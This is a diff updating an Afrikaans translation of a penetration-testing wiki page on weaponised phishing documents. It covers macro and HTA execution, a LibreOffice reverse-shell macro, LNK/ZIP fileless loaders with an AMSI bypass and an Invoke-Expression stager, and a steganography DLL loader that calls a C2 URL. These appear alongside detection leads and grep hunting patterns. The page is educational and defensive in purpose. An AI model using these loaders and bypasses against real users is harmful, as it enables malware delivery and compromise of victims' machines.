@@ -1,42 +1,44 @@
-# Phishing-lêers en -dokumente
+# Phishing-lêers en dokumente
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Office-dokumente
 
-Microsoft Word valideer lêerdata voordat dit ’n lêer oopmaak. Datavalidering vind plaas deur die datastruktuur te identifiseer volgens die OfficeOpenXML-standaard. As ’n fout tydens die identifisering van die datastruktuur voorkom, sal die lêer wat ontleed word nie oopgemaak word nie.
+Microsoft Word valideer lêerdata voordat dit 'n lêer oopmaak. Datavalidering word uitgevoer deur die datastruktuur teen die OfficeOpenXML-standaard te identifiseer. As enige fout tydens die identifisering van die datastruktuur voorkom, sal die lêer wat ontleed word nie oopgemaak word nie.
 
-Word-lêers wat makro’s bevat, gebruik gewoonlik die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds die makro’s te laat uitvoer.\
-Byvoorbeeld, ’n RTF-lêer ondersteun nie makro’s nie, volgens ontwerp, maar ’n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer kan word en makro’s kan uitvoer.\
-Dieselfde interne werking en meganismes geld vir al die sagteware in die Microsoft Office Suite (Excel, PowerPoint, ens.).
+Gewoonlik gebruik Word-lêers wat macros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds die vermoë te behou om macros uit te voer.\
+'n RTF-lêer ondersteun byvoorbeeld nie macros nie, volgens ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en macros kan uitvoer.\
+Dieselfde interne werking en meganismes geld vir alle sagteware in die Microsoft Office-suite (Excel, PowerPoint, ens.).
 
-Jy kan die volgende opdrag gebruik om na te gaan watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
+Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
 
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
 
-DOCX-lêers wat na ’n afgeleë sjabloon verwys (File –Options –Add-ins –Manage: Templates –Go) wat macros bevat, kan ook macros “uitvoer”.
+DOCX-lêers wat na ’n remote template verwys (File –Options –Add-ins –Manage: Templates –Go) wat macros insluit, kan ook macros “uitvoer”.
 
 ### Eksterne beeldlaai
 
 Gaan na: _Insert --> Quick Parts --> Field_\
-_**Kategorieë**: Links and References, **Veldname**: includePicture, en **Lêernaam of URL:**_ http://<ip>/whatever
+_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
 
-![Office Documents - External Image Load: Gaan na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)
+![Office Documents - Eksterne beeldlaai: Gaan na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)
 
-### Macros-agterdeur
+Vir die ontleding van ’n ontvangde dokument eerder as om een te skep, sien [VBA-macro-ontleding: gemorskode en UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).
 
-Dit is moontlik om macros te gebruik om arbitrêre kode vanuit die dokument uit te voer.
+### Macro-agterdeur
+
+Dit is moontlik om macros te gebruik om arbitrêre code vanuit die dokument uit te voer.
 
 #### Outolaai-funksies
 
-Hoe algemener hulle is, hoe groter is die waarskynlikheid dat die AV hulle sal opspoor.
+Hoe meer algemeen hulle is, hoe waarskynliker is dit dat die AV hulle sal opspoor.
 
 - AutoOpen()
 - Document_Open()
 
-#### Kodevoorbeelde vir macros
+#### Voorbeelde van macro-code
 
 ```vba
 Sub AutoOpen()
@@ -70,14 +72,14 @@ proc.Create "powershell <beacon line generated>
 
 #### Verwyder metadata handmatig
 
-Gaan na **Lêer > Info > Inspekteer dokument > Inspekteer dokument** om die Dokumentinspekteur oop te maak. Klik **Inspekteer** en dan **Verwyder alles** langs **Dokumenteienskappe en persoonlike inligting**.
+Gaan na **Lêer > Inligting > Inspekteer dokument > Inspekteer dokument** om die Dokumentinspekteur oop te maak. Klik **Inspekteer** en dan **Verwyder alles** langs **Dokumenteienskappe en persoonlike inligting**.
 
 #### Doc-uitbreiding
 
 Wanneer jy klaar is, kies die **Stoor as tipe**-aftreklys en verander die formaat van **`.docx`** na Word 97-2003 **`.doc`**.\
-Doen dit omdat jy **nie makro's in 'n `.docx` kan stoor nie** en daar 'n **stigma** **kleef aan** die makro-geaktiveerde **`.docm`**-uitbreiding (die kleinkiekie-ikoon het byvoorbeeld 'n groot `!`, en sommige web-/e-pospoorte blokkeer dit heeltemal). Daarom is hierdie **verouderde `.doc`-uitbreiding die beste kompromie**.
+Doen dit omdat jy **nie makro's binne 'n `.docx` kan stoor nie** en daar **'n stigma rondom** die makro-geaktiveerde **`.docm`**-uitbreiding is (bv. die duimnaelikoon het 'n groot `!` en sommige web-/e-pospoorte blokkeer dit heeltemal). Daarom is hierdie **verouderde `.doc`-uitbreiding die beste kompromie**.
 
-#### Skepgereedskap vir kwaadwillige makro's
+#### Kwaadwillige makrogenerators
 
 - MacOS
   - [**macphish**](https://github.com/cldrn/macphish)
@@ -85,7 +87,7 @@ Doen dit omdat jy **nie makro's in 'n `.docx` kan stoor nie** en daar 'n **stigm
 
 ## LibreOffice ODT-outomatiese makro's (Basic)
 
-LibreOffice Writer-dokumente kan Basic-makro's insluit en dit outomaties laat loop wanneer die lêer oopgemaak word, deur die makro aan die **Maak dokument oop**-gebeurtenis te koppel (Gereedskap → Pas aan → Gebeurtenisse → Maak dokument oop → Makro…).<sup>[[1]](#references)</sup> 'n Eenvoudige reverse shell-makro lyk soos volg:
+LibreOffice Writer-dokumente kan Basic-makro's insluit en dit outomaties laat loop wanneer die lêer oopgemaak word deur die makro aan die **Open Document**-gebeurtenis te koppel (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> 'n Eenvoudige reverse shell-makro lyk soos volg:
 
 ```vb
 Sub Shell
@@ -93,18 +95,18 @@ Sub Shell
 End Sub
 ```
 
-Let op die dubbele aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik dit om letterlike aanhalingstekens te ontsnap, dus bly die binne-opdrag en die Shell-argument gebalanseer in payloads wat eindig op `...==""")`.
+Let op die dubbele aanhalingstekens (`""`) binne die string – LibreOffice Basic gebruik hulle om letterlike aanhalingstekens te ontsnap, dus bly payloads wat eindig op `...==""")` gebalanseer met beide die binneste opdrag en die Shell-argument.
 
 Afleweringswenke:
 
 - Stoor as `.odt` en koppel die makro aan die dokumentgebeurtenis sodat dit onmiddellik loop wanneer die dokument oopgemaak word.
-- Wanneer jy met `swaks` e-pos stuur, gebruik `--attach @resume.odt` (die `@` is nodig sodat die lêer se grepe, en nie die lêernaamstring nie, as aanhegsel gestuur word). Dit is van kritieke belang wanneer SMTP-bedieners misbruik word wat arbitrêre `RCPT TO`-ontvangers sonder validering aanvaar.
+- Gebruik `--attach @resume.odt` wanneer jy met `swaks` e-pos stuur (die `@` is nodig sodat die lêer se grepe, nie die lêernaamstring nie, as die aanhegsel gestuur word). Dit is krities wanneer SMTP-bedieners misbruik word wat arbitrêre `RCPT TO`-ontvangers sonder validering aanvaar.
 
 ## HTA-lêers
 
-’n HTA is ’n Windows-program wat **HTML en skrifttale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en loop as ’n "volledig vertroude" toepassing, sonder die beperkings van ’n blaaier se sekuriteitsmodel.
+’n HTA is ’n Windows-program wat **HTML en skriftale (soos VBScript en JScript) kombineer**. Dit genereer die gebruikerskoppelvlak en word as ’n “volledig vertroude” toepassing uitgevoer, sonder die beperkings van ’n blaaier se sekuriteitsmodel.
 
-’n HTA word met **`mshta.exe`** uitgevoer, wat gewoonlik saam met **Internet Explorer** **geïnstalleer** word, wat **`mshta` van IE afhanklik maak**. As IE dus verwyder is, sal HTA’s nie kan loop nie.
+’n HTA word met **`mshta.exe`** uitgevoer, wat tipies saam met **Internet Explorer geïnstalleer** word, wat beteken dat **`mshta` van IE afhanklik is**. As dit dus verwyder is, sal HTA’s nie kan uitvoer nie.
 
 ```html
 <--! Basic HTA Execution -->
@@ -163,15 +165,15 @@ Afleweringswenke:
 
 ## Vals aanhegselkaarte in HTML-e-pos
 
-’n HTML-e-pos kan ’n diensverskaffer se oorspronklike voorskoukaart vir aanhegsels naboots sonder om ’n werklike aanhegsel te bevat. Talos het ’n Gmail-kaart waargeneem wat uit vier Base64-geënkodeerde PNG MIME-dele in die e-pos opgebou is. Die volledige visuele element was in een anker toegedraai, en ’n ontvangerwaarde in `?m=<target-id>` het opsporing per ontvanger moontlik gemaak. Die skakel het met `//` begin, eerder as met `http://` of `https://`; blaaiers los dié protokolrelatiewe vorm op, maar URL-onttrekkers wat net volledig gekwalifiseerde URL’s pas, kan dit mis.<sup>[[11]](#references)</sup>
+’n HTML-e-pos kan ’n verskaffer se inheemse voorskoukaart vir aanhegsels naboots sonder om ’n werklike aanhegsel te bevat. Talos het ’n Gmail-kaart waargeneem wat uit vier Base64-geënkodeerde ingebedde PNG-MIME-onderdele herbou is. Die volledige visuele element was in een anker toegedraai, en ’n ontvangerwaarde in `?m=<target-id>` het per-ontvangersporing moontlik gemaak. Die skakel het met `//` begin eerder as met `http://` of `https://`; blaaiers verwerk hierdie protokolrelatiewe vorm, maar URL-onttrekkers wat net volledig gekwalifiseerde URL’s herken, kan dit miskyk.<sup>[[11]](#references)</sup>
 
-Inspekteer tydens ontleding die rou MIME eerder as om die weergegewe lys van aanhegsels te vertrou. Rekonstrueer hoe die inlyn-beelddele die visuele kaart vorm, identifiseer die anker wat dit omsluit en normaliseer protokolrelatiewe `href`-waardes voordat jy URL’s onttrek.<sup>[[11]](#references)</sup>
+Inspekteer tydens ontleding die rou MIME eerder as om die weergegewe aanhegsellys te vertrou. Stel vas hoe die ingebedde beeldonderdele die visuele kaart vorm, identifiseer die omringende anker en normaliseer protokolrelatiewe `href`-waardes voordat URL’s onttrek word.<sup>[[11]](#references)</sup>
 
-Sien [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender) vir spoofing van die sender in die koevert/hoofde en DMARC-belyningstoetsing.
+Vir vervalsing van die afsender in die koevert-/kopskrif en DMARC-belyningstoetsing, sien [teenmaatreëls teen SMTP-posvervalsing](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).
 
-## Forsering van NTLM-verifikasie
+## NTLM-verifikasie afdwing
 
-Daar is verskeie maniere om NTLM-verifikasie **"op afstand" te forseer**. Jy kan byvoorbeeld **onsigbare beelde** by e-posse of HTML voeg waartoe die gebruiker toegang sal kry (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat ’n **verifikasie** sal **aktiveer** bloot deur **die vouer oop te maak**.
+Daar is verskeie maniere om NTLM-verifikasie op afstand af te dwing. Jy kan byvoorbeeld **onsigbare beelde** by e-posse of HTML voeg waartoe die gebruiker toegang kry (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat **verifikasie sal aktiveer** bloot deur die **lêergids oop te maak.**
 
 **Kyk na hierdie idees en meer op die volgende bladsye:**
 
@@ -189,22 +191,22 @@ Daar is verskeie maniere om NTLM-verifikasie **"op afstand" te forseer**. Jy kan
 
 Moenie vergeet dat jy nie net die hash of die verifikasie kan steel nie, maar ook **NTLM relay-aanvalle kan uitvoer**:
 
-- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+- [**NTLM Relay-aanvalle**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+- [**AD CS ESC8 (NTLM relay na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
-## LNK-laaiers + ZIP-ingebedde payloads (lêerlose ketting)
+## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Uiters doeltreffende veldtogte lewer ’n ZIP af wat twee wettige lokdokumente (PDF/DOCX) en ’n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell-loader ná ’n unieke merker in die rou grepe van die ZIP gestoor word, en dat die .lnk dit uitsny en volledig in memory uitvoer.<sup>[[2]](#references)</sup>
+Uiters doeltreffende veldtogte lewer ’n ZIP af wat twee wettige lokdokumente (PDF/DOCX) en ’n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell-loader ná ’n unieke merker in die rou grepe van die ZIP gestoor word, en die .lnk dit daaruit haal en volledig in die geheue uitvoer.<sup>[[2]](#references)</sup>
 
-Tipiese vloei wat deur die .lnk PowerShell-eenreëlskrip geïmplementeer word:
+Tipiese vloei wat deur die .lnk PowerShell-eenreëlprogram geïmplementeer word:
 
-1) Soek die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData% en die ouervouer van die huidige werkgids.
+1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData% en die ouergids van die huidige werkdirectory.
 2) Lees die ZIP-grepe en vind ’n hardgekodeerde merker (bv. xFIQCV). Alles ná die merker is die ingebedde PowerShell-payload.
-3) Kopieer die ZIP na %ProgramData%, pak dit daar uit en maak die lok- .docx oop om dit wettig te laat lyk.
+3) Kopieer die ZIP na %ProgramData%, pak dit daar uit en maak die lok-.docx oop om wettig te lyk.
 4) Omseil AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) Deobfuskeer die volgende stadium (bv. verwyder alle #-karakters) en voer dit in memory uit.
+5) Deobfuskeer die volgende stadium (bv. verwyder alle #-karakters) en voer dit in die geheue uit.
 
-Voorbeeld van ’n PowerShell-raamwerk om die ingebedde stadium uit te sny en uit te voer:
+Voorbeeld van ’n PowerShell-raamwerk om die ingebedde stadium uit te haal en uit te voer:
 
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
@@ -223,35 +225,35 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 
-Aantekeninge
-- Aflewering misbruik dikwels subdomeine van betroubare PaaS-dienste (bv. *.herokuapp.com) en kan loonvragte voorwaardelik bedien (bedien onskadelike ZIP-lêers op grond van IP/UA).
-- Die volgende stadium dekripteer dikwels base64/XOR-shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyfspore te beperk.
+Notes
+- Aflewering misbruik dikwels betroubare PaaS-subdomeine (bv. *.herokuapp.com) en kan payloads afskerm (bedien onskadelike ZIP-lêers op grond van IP/UA).
+- Die volgende stadium dekripteer dikwels base64/XOR-shellcode en voer dit via Reflection.Emit + VirtualAlloc uit om skyfspore te beperk.
 
-Volharding wat in dieselfde ketting gebruik word
-- COM TypeLib-kaping van die Microsoft Web Browser-beheer sodat IE/Explorer of enige toepassing wat dit insluit, die loonvrag outomaties herbegin.<sup>[[2]](#references)[[4]](#references)</sup> Sien besonderhede en gereed-vir-gebruik-opdragte hier:
+Persistensie wat in dieselfde ketting gebruik word
+- COM TypeLib-kaping van die Microsoft Web Browser-beheer, sodat IE/Explorer of enige toepassing wat dit inbed, die payload outomaties weer begin.<sup>[[2]](#references)[[4]](#references)</sup> Sien besonderhede en gereed-vir-gebruik-opdragte hier:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
-Opsporing/IOK's
-- ZIP-lêers wat die ASCII-merkerstring (bv. xFIQCV) agteraan die argiefdata bevat.
-- .lnk wat ouer-/gebruikervouers deurgaan om die ZIP op te spoor en ’n lokdokument oopmaak.
-- AMSI-peutery via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
-- Langdurige besigheidse-posdrade wat eindig met skakels wat onder vertroude PaaS-domeine gehuisves word.
+Jag/IOCs
+- ZIP-lêers wat die ASCII-merkerstring (bv. xFIQCV) aan die argiefdata geheg bevat.
+- .lnk wat ouer-/gebruikersvouers deursoek om die ZIP op te spoor en ’n lokdokument oopmaak.
+- AMSI-peutering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- Langdurige besigheids-e-posdrade wat eindig met skakels onder vertroude PaaS-domeine.
 
-## LNK-eers-lokdokument-stadiëring → geskeduleerde-taak-volharding → betroubare CPL-sylaai
+## .lnk-lokdokument-eerste-stadiëring → geskeduleerde-taak-persistensie → vertroude CPL-sylaaiing
 
-Nog ’n patroon wat gereeld voorkom, is ’n **dokument-nabootsende `.lnk`** wat onmiddellik ’n onskadelike lokdokument oopmaak terwyl dit die werklike ketting in die agtergrond voorberei.<sup>[[3]](#references)</sup>
+Nog ’n terugkerende patroon is ’n **dokument-nabootsende `.lnk`** wat onmiddellik ’n onskadelike lokdokument oopmaak terwyl dit die werklike ketting in die agtergrond voorberei.<sup>[[3]](#references)</sup>
 
-Waargenome werksvloei:
-1. Die kortpad **doen hom voor as ’n PDF** en gebruik `conhost.exe` of ’n soortgelyke instaanprogram om ’n verduisterde PowerShell-aflaaier te begin.
-2. PowerShell fragmenteer ooglopende tekens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) sodat naïewe opsporing wat na `iwr`, `gci`, `ren`, `cpi` of `schtasks` soek, die opdrag mis.
-3. Die stager laai **eers die lokdokument af**, maak dit vir die slagoffer oop en rekonstrueer dan die kwaadwillige lêers in die agtergrond.
-4. Loonvragte kan met **rommeluitbreidings** geskryf en daarna hernoem word deur vulkarakters te verwyder, wat die verskyning van ooglopende `.exe` / `.cpl`-artefakte vertraag.
-5. Volharding word gevestig met ’n **geskeduleerde taak wat elke minuut loop** en ’n betroubare gasheerbinêre lêer vanaf ’n pad skryfbaar deur die gebruiker begin.
+Waargenome werkvloei:
+1. Die kortpad **doen hom as ’n PDF voor** en gebruik `conhost.exe` of ’n soortgelyke instaanprogram om ’n verduisterde PowerShell-aflaaier te begin.
+2. PowerShell breek ooglopende tokens op (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) sodat naïewe opsporings wat vir `iwr`, `gci`, `ren`, `cpi` of `schtasks` soek, die opdrag miskyk.
+3. Die stager laai **eers die lokdokument af**, maak dit vir die slagoffer oop en bou daarna die kwaadwillige lêers in die agtergrond weer op.
+4. Payloads kan met **rommeluitbreidings** geskryf en daarna hernoem word deur vulkarakters te verwyder, wat die verskyning van ooglopende `.exe` / `.cpl`-artefakte vertraag.
+5. Persistensie word gevestig met ’n **taakskeduleerdertaak wat elke minuut loop** en ’n vertroude gasheerbinêr vanaf ’n skryfbare gebruikerspad begin.
 
-Minimale opsporingsleidrade uit hierdie patroon:
+Minimale jagleidrade uit hierdie patroon:
 
 ```powershell
 # Suspicious split-token PowerShell seen in LNK chains
@@ -260,25 +262,25 @@ r''e''n
 &(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
 ```
 
-’n Nuttige staging-uitleg om te herken, is:
+’n Nuttige staging-uitleg om te herken:
 - `C:\Users\Public\<decoy>.pdf`
 - `C:\Users\Public\<trusted>.exe`
 - `C:\Users\Public\<malicious>.cpl` or `.dll`
 - `C:\Windows\Tasks\<blob>.dat`
 
-### Waarom die tweede fase stealthy is
+### Waarom die tweede stadium stealthy is
 
-In die Rapid7-gevallestudie het die scheduled task **`Fondue.exe`** herhaaldelik vanaf `C:\Users\Public\` geloods. Omdat **`APPWIZ.cpl`** langsaan geplaas is en **`RunFODW`** uitgevoer het, het die vertroude Microsoft-binary die aanvaller se CPL gelaai in plaas van die wettige stelselkopy.
+In die Rapid7-gevallestudie het die geskeduleerde taak **`Fondue.exe`** herhaaldelik vanaf `C:\Users\Public\` geloods. Omdat **`APPWIZ.cpl`** langsaan geplaas is en **`RunFODW`** uitgevoer het, het die vertroude Microsoft-binêre die aanvaller se CPL side-loaded in plaas van die wettige stelselkopie.
 
 Die CPL:
 - Lees ’n **AES-256-CBC**-blob vanaf `C:\Windows\Tasks\editor.dat`
-- Dekripteer dit met **Windows CNG / `bcrypt.dll`**
-- Ken uitvoerbare geheue toe en kopieer die gedecrypte shellcode daarin
-- Voer dit indirek uit deur die shellcode-wyser as die callback vir **`EnumUILanguagesW`** deur te gee
+- Ontsyfer dit deur **Windows CNG / `bcrypt.dll`**
+- Ken uitvoerbare geheue toe en kopieer die ontsyferde shellcode daarheen
+- Voer dit indirek uit deur die shellcode-wyser as die terugroepfunksie vir **`EnumUILanguagesW`** te gebruik
 
-Daardie laaste stap is afsonderlik die moeite werd om na te speur: malware vermy dikwels ’n direkte `((void(*)())buf)()`-sprong en misbruik eerder ’n **wettige WinAPI wat ’n callback aanvaar** om uitvoering oor te dra.
+Dié laaste stap is die moeite werd om afsonderlik te ondersoek: malware vermy dikwels ’n direkte `((void(*)())buf)()`-sprong en misbruik eerder ’n **wettige WinAPI wat ’n terugroepfunksie aanvaar** om uitvoering oor te dra.
 
-Die gedecrypte payload in hierdie veldtog was **Donut**-shellcode, wat daarna die finale PE volledig in geheue gekarteer en **AMSI/WLDP/ETW** in die huidige proses gepatch het voordat uitvoering oorgedra is. Vir meer besonderhede oor side-loading en naverwerking wat in geheue plaasvind, sien:
+Die ontsyferde payload in hierdie veldtog was **Donut**-shellcode, wat toe die finale PE volledig in geheue gekarteer en **AMSI/WLDP/ETW** in die huidige proses gepatch het voordat dit uitvoering oorgedra het. Sien die volgende vir meer besonderhede oor side-loading en geheue-inwonende naverwerking:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
@@ -290,25 +292,25 @@ Die gedecrypte payload in hierdie veldtog was **Donut**-shellcode, wat daarna di
 
 Praktiese ondersoekpunte:
 - `.lnk` wat `powershell.exe` of `conhost.exe` loods, gevolg deur ’n sigbare lokdokument.
-- Kortstondige downloads na **`C:\Users\Public\`**, gevolg deur onmiddellike hernoemings vanaf onsinnige uitbreidings.
-- Scheduled tasks met alledaagse name soos `GoogleErrorReport` wat vanaf **gebruikersskryfbare gidse** uitgevoer word.
+- Kortstondige downloads na **`C:\Users\Public\`**, gevolg deur onmiddellike hernoemings vanaf nonsensuitbreidings.
+- Geskeduleerde take met onopvallende name soos `GoogleErrorReport` wat vanaf **gebruiker-skryfbare gidse** uitgevoer word.
 - Vertroude binaries wat **`.cpl` / `.dll`**-lêers vanaf dieselfde nie-stelselgids laai.
-- Base64-teksblobs wat onder **`C:\Windows\Tasks\`** geskryf en daarna deur die side-loaded module gelees word.
+- Base64-teksblobs wat onder **`C:\Windows\Tasks\`** geskryf en dan deur die side-loaded module gelees word.
 
 ## Steganografie-afgebakende payloads in beelde (PowerShell-stager)
 
-Onlangse loader-kettings lewer ’n verduisterde JavaScript/VBS af wat ’n Base64 PowerShell-stager dekodeer en laat loop. Daardie stager laai ’n beeld af (dikwels GIF) wat ’n Base64-geënkodeerde .NET DLL bevat wat as gewone teks tussen unieke begin-/eindmerkers versteek is. Die script soek hierdie afbakenings (voorbeelde wat in die natuur gesien is: «<<sudo_png>> … <<sudo_odt>>>»), onttrek die teks tussenin, dekodeer dit met Base64 na grepe, laai die assembly in geheue en roep ’n bekende toegangmetode met die C2-URL aan.<sup>[[5]](#references)</sup>
+Onlangse loader-kettings lewer ’n verduisterde JavaScript/VBS wat ’n Base64 PowerShell-stager dekodeer en uitvoer. Dié stager laai ’n beeld af (dikwels GIF) wat ’n Base64-geënkodeerde .NET DLL as gewone teks tussen unieke begin-/eindmerkers versteek. Die script soek na hierdie afbakenings (voorbeelde wat in die natuur waargeneem is: «<<sudo_png>> … <<sudo_odt>>>»), onttrek die teks daartussen, dekodeer dit met Base64 na grepe, laai die assembly in die geheue en roep ’n bekende toegangmetode met die C2-URL aan.<sup>[[5]](#references)</sup>
 
 Werkvloei
 - Fase 1: Geargiveerde JS/VBS-dropper → dekodeer ingebedde Base64 → loods PowerShell-stager met -nop -w hidden -ep bypass.
-- Fase 2: PowerShell-stager → laai beeld af, sny merker-afgebakende Base64 uit, laai die .NET DLL in geheue en roep sy metode aan (bv. VAI) met die C2-URL en opsies.
-- Fase 3: Loader haal die finale payload op en spuit dit gewoonlik via process hollowing in ’n vertroude binary in (dikwels MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Lees hier meer oor process hollowing en proxy-uitvoering via vertroude nutsprogramme:
+- Fase 2: PowerShell-stager → laai beeld af, onttrek merker-afgebakende Base64, laai die .NET DLL in die geheue en roep sy metode aan (bv. VAI) met die C2-URL en opsies.
+- Fase 3: Loader haal die finale payload op en injecteer dit gewoonlik via process hollowing in ’n vertroude binêre (dikwels MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Sien hier meer oor process hollowing en die uitvoering van proxy-prosesse via vertroude nutsprogramme:
 
 {{#ref}}
 ../../reversing/common-api-used-in-malware.md
 {{#endref}}
 
-PowerShell-voorbeeld om ’n DLL uit ’n beeld uit te sny en ’n .NET-metode in geheue aan te roep:
+PowerShell-voorbeeld om ’n DLL uit ’n beeld te onttrek en ’n .NET-metode in die geheue aan te roep:
 
 <details>
 <summary>PowerShell-stego-payload-onttrekker en loader</summary>
@@ -337,12 +339,12 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 
 </details>
 
-Aantekeninge
-- Dit is ATT&CK T1027.003 (steganografie/merkerverberging).<sup>[[6]](#references)</sup> Merkers verskil tussen veldtogte.
-- AMSI/ETW-bypass en string-deobfuskasie word algemeen toegepas voordat die assembly gelaai word.
-- Opsporing: skandeer afgelaaide beelde vir bekende skeidingstekens; identifiseer PowerShell wat beelde lees en onmiddellik Base64-blokke dekodeer.
+Notas
+- Dit is ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Merkers verskil tussen veldtogte.
+- AMSI/ETW-bypass en string-deobfuscation word algemeen toegepas voordat die assembly gelaai word.
+- Opsporing: skandeer afgelaaide beelde vir bekende skeidingstekens; identifiseer PowerShell wat toegang tot beelde kry en Base64-blobs onmiddellik dekodeer.
 
-Sien ook stego-nutsgoed en carving-tegnieke:
+Sien ook stego-gereedskap en carving-tegnieke:
 
 {{#ref}}
 ../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
@@ -350,23 +352,23 @@ Sien ook stego-nutsgoed en carving-tegnieke:
 
 ## JS/VBS-droppers → Base64 PowerShell-staging
 
-’n Herhalende aanvanklike stadium is ’n klein, sterk geobfuskeerde `.js`- of `.vbs`-lêer wat in ’n argief afgelewer word. Die enigste doel daarvan is om ’n ingebedde Base64-string te dekodeer en PowerShell met `-nop -w hidden -ep bypass` te begin om die volgende stadium oor HTTPS te laai.<sup>[[5]](#references)</sup>
+’n Terugkerende aanvanklike stadium is ’n klein, sterk geobfuskeerde `.js`- of `.vbs`-lêer wat binne ’n argief afgelewer word. Die enigste doel daarvan is om ’n ingebedde Base64-string te dekodeer en PowerShell met `-nop -w hidden -ep bypass` te begin om die volgende stadium oor HTTPS te aktiveer.<sup>[[5]](#references)</sup>
 
-Skematiese logika (abstrak):
+Basiese logika (abstrak):
 - Lees die inhoud van die eie lêer
-- Vind ’n Base64-blok tussen gemorsstringe
+- Vind ’n Base64-blob tussen rommelstringe
 - Dekodeer dit na ASCII PowerShell
-- Voer dit uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` oproep
+- Voer dit uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` aanroep
 
-Opsporingsaanwysings
-- JS/VBS-aanhegsels in argiewe wat `powershell.exe` begin, met `-enc`/`FromBase64String` in die opdragreël.
-- `wscript.exe` wat `powershell.exe -nop -w hidden` vanuit tydelike gebruikersgidse begin.
+Opsporingsleidrade
+- Geargiveerde JS/VBS-aanhegsels wat `powershell.exe` begin met `-enc`/`FromBase64String` in die opdragreël.
+- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf tydelike gebruikersgidspaaie begin.
 
 ## MSC-dokumente as uitvoeringshouers (GrimResource)
 
-Microsoft Management Console-lêers (`.msc`) is XML-konsoledefinisies wat gewoonlik met `mmc.exe` oopgemaak word. **GrimResource** bewapen ’n `StringTable`-verwysing na ’n `apds.dll`-hulpbron wat ’n ou XSS-primitief bevat, sodat JavaScript binne `mmc.exe` loop wanneer ’n gebruiker die vervaardigde konsole oopmaak. Waargenome voorbeelde het `transformNode`-gebaseerde obfuskasie met **DotNetToJScript** gekombineer om ’n .NET-loonvrag te instansieer sonder die gewone Office-makro-roete.<sup>[[9]](#references)</sup>
+Microsoft Management Console-lêers (`.msc`) is XML-konsoledefinisies wat normaalweg deur `mmc.exe` oopgemaak word. **GrimResource** bewapen ’n `StringTable`-verwysing na ’n `apds.dll`-hulpbron wat ’n ou XSS-primitief bevat, sodat JavaScript binne `mmc.exe` loop wanneer ’n gebruiker die vervaardigde konsole oopmaak. Waargenome voorbeelde het `transformNode`-gebaseerde obfuscation met **DotNetToJScript** gekombineer om ’n .NET-payload te instansieer sonder die gewone Office-macro-pad.<sup>[[9]](#references)</sup>
 
-Vir statiese triage, hanteer ’n onvertroude MSC as teks en moet dit **nie** dubbelklik nie:<sup>[[9]](#references)</sup>
+Behandel ’n MSC-lêer wat nie vertrou word nie as teks tydens statiese triage en **moenie daarop dubbelklik nie**:<sup>[[9]](#references)</sup>
 
 ```bash
 file lure.msc
@@ -375,13 +377,13 @@ grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64S
 strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
 ```
 
